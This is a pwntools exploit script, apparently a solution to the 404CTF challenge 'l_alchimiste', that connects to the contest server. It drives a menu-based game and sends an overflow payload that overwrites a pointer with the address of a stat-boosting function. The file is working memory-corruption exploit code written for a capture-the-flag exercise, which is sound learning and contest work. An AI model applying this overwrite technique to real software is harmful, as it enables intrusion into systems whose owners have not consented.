from pwn import *
import time

#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

e = ELF('l_alchimiste')

#p = e.process()
p = remote('challenges.404ctf.fr', 30944)


for i in range(11):
	print(p.recvline())


p.send(b'1\n')
print(p.recvline())
print(p.recvline())

force_baddr = p.recvline().split(b' ~ ')[1][:-1]
print('DEBUG', force_baddr)
force_baddr = int(force_baddr, 16)
print(p.recvline())


# Strength to 150
for i in range(5):
	#time.sleep(0.5)
	print('DEBUG', i)
	for _ in range(6):
		print(p.recvline())
	p.send(b'2\n') # use
	print(p.recvline() + b'2')
	for _ in range(4+6):
		print(p.recvline())
	p.send(b'3\n')
	print(p.recvline() + b'3')
	p.send(b'Elixir d\n')
	for _ in range(2):
		print(p.recvline())

for _ in range(6):
	p.recvline()
p.send(b'2\n')
for _ in range(5+6):
	p.recvline()
print('######################################################')
print('strength 160')
print('######################################################')

incInt = int('0x004008d5', 16)
test = b'a' * 16 * 4
test += b'\xd5\x08\x40\x00'


print(test)
# Int to 150
for i in range(10):
	time.sleep(0.5)
	print(i)
	p.send(b'3\n')
	print(p.recvline(), '---')
	p.send(test)
	for _ in range(2+6):
		print(p.recvline())
	print('---')
	p.send(b'2\n')
	for _ in range(5+6):
		print(p.recvline())

print('int 150')

p.interactive()